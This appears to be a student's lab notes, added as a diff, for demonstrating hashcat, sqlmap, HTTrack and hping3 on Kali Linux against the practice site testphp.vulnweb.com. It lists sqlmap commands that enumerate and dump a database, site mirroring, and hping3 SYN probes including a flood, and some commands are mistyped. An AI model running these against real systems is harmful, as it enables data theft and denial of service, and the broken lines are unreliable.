@@ -1,0 +1,69 @@
+Exp1-b 
+HASHCAT
+
+hashcat -h 
+
+hashcat --version
+
+cho -n AYUSH | md5sum
+
+
+
+Exp-3 
+Aim: To demonstrate Hacking tools on Kali-Linux: SQL Map, HTTrack.
+Objective: To demonstrate the use of SQLMap for detecting and exploiting SQL injection vulnerabilities and HTTrack for website mirroring on Kali Linux, highlighting their applications in ethical hacking and security assessments.
+
+SQL MAPPING 
+
+sqlmap -u "https://testphp.vulnweb.com/listproducts.php?cat=1" --dbs
+
+
+sqlmap -u "https://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart --tables
+
+
+sqlmap -u "https://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart --dump 
+
+
+HTTRACK
+
+sudo apt install httrack -y 
+
+httrack --version
+
+httrack https://testphp.vulnweb.com/ -O ~/httrack_site 
+
+cd ~/httrack_site
+
+cd ~/httrack_site/testphp.vulnweb.com
+
+firefox index.html
+
+
+
+EXP-4
+To demonstrate hacking web applications using hping and burp suite tools on kali linux. 
+
+HPING
+
+sudo apt install hping3
+
+hping3 --version
+
+sudo hping3 -S -p 80 -c 3 test.php.vulnweb.com
+
+sudo hping3 -S -p 80 -c 5 google.com.
+
+sudo hping3 -S -p 80 --flood 127.0.0.1
+sudo hping3 -S -p 80 -c 5 test.php
+
+sudo hping3 -S -p 80 -c 5 test.php
+
+sudo hping3 -S -p 80 -c 5 https://testphp.vulnweb.com/
+
+sudo hping3 -S -p 80 -c 5 testphp.vulnweb.com 
+
+
+
+
+
+
